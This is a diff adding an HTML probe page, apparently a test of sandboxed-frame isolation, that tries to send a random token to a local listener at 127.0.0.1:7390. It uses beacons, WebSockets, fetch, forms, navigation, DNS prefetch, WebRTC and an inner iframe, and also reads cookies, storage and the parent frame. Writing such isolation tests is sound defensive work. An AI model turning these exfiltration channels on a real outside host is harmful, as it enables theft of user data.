@@ -1,0 +1,51 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Probe</title>
+<link rel="stylesheet" href="http://127.0.0.1:7390/css">
+<link rel="prefetch" href="http://127.0.0.1:7390/prefetch">
+<link rel="preconnect" href="http://127.0.0.1:7390">
+<style>body { font: 14px sans-serif } .ok { color: green } .no { color: #b00 }</style>
+</head><body>
+<h1 id="h">Probe</h1>
+<img src="http://127.0.0.1:7390/img-tag" alt="">
+<ul id="out"></ul>
+<script>
+const SECRET = 'secret-' + Math.floor(Math.random() * 1e6);
+const results = {};
+const say = (k, v) => { results[k] = String(v); const li = document.createElement('li'); li.textContent = k + ': ' + v; document.getElementById('out').append(li); };
+say('scripts', 'ran');
+const tryIt = (k, f) => { try { const r = f(); say(k, r === undefined ? 'no error' : r); } catch (e) { say(k, 'threw ' + e.name); } };
+tryIt('origin', () => self.origin);
+tryIt('parent.document', () => typeof parent.document.title);
+tryIt('localStorage', () => typeof localStorage.length);
+tryIt('cookie', () => JSON.stringify(document.cookie));
+tryIt('window.open', () => String(window.open('http://127.0.0.1:7390/open?' + SECRET)));
+tryIt('sendBeacon', () => navigator.sendBeacon('http://127.0.0.1:7390/beacon?' + SECRET, 'x'));
+tryIt('WebSocket', () => { new WebSocket('ws://127.0.0.1:7390/ws?' + SECRET); return 'made'; });
+tryIt('Image', () => { new Image().src = 'http://127.0.0.1:7390/image?' + SECRET; return 'set'; });
+tryIt('EventSource', () => { new EventSource('http://127.0.0.1:7390/sse?' + SECRET); return 'made'; });
+tryIt('Worker', () => { new Worker(URL.createObjectURL(new Blob(["fetch('http://127.0.0.1:7390/worker')"], {type: 'text/javascript'}))); return 'made'; });
+fetch('http://127.0.0.1:7390/fetch?' + SECRET, { mode: 'no-cors' }).then(() => say('fetch out', 'went'), (e) => say('fetch out', 'failed ' + e.name));
+fetch('/api/v1/sessions').then((r) => say('fetch Demido', 'answered ' + r.status), (e) => say('fetch Demido', 'failed ' + e.name));
+tryIt('top.location', () => { top.location = 'http://127.0.0.1:7390/top?' + SECRET; return 'set'; });
+tryIt('form', () => { const f = document.createElement('form'); f.action = 'http://127.0.0.1:7390/form?' + SECRET; f.method = 'post'; document.body.append(f); f.submit(); return 'submitted'; });
+tryIt('dns-prefetch', () => { const l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = '//' + SECRET + '.dns-probe.invalid'; document.head.append(l); return 'added'; });
+// WebRTC: gathering candidates sends a STUN packet to each server named, by UDP.
+tryIt('WebRTC', () => {
+  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:7391' }] });
+  pc.createDataChannel('x');
+  pc.onicecandidate = (e) => { if (e.candidate) say('WebRTC candidate', e.candidate.type + ' ' + (e.candidate.address || '')); };
+  pc.createOffer().then((o) => pc.setLocalDescription(o)).then(() => say('WebRTC offer', 'set'), (e) => say('WebRTC offer', 'failed ' + e.name));
+  return 'made';
+});
+// A frame inside the page, sending itself elsewhere.
+setTimeout(() => {
+  const inner = document.createElement('iframe');
+  inner.srcdoc = "<script>location.href = 'http://127.0.0.1:7390/inner-nav?" + SECRET + "'<\/script>";
+  document.body.append(inner);
+  say('inner frame', 'made');
+}, 1500);
+setTimeout(() => { try { parent.postMessage({ probe: results }, '*'); } catch (e) {} }, 3000);
+// Last: the page sends its own frame elsewhere, with the secret in the address.
+setTimeout(() => { location.href = 'http://127.0.0.1:7390/self-nav?' + SECRET; }, 3500);
+</script>
+</body></html>
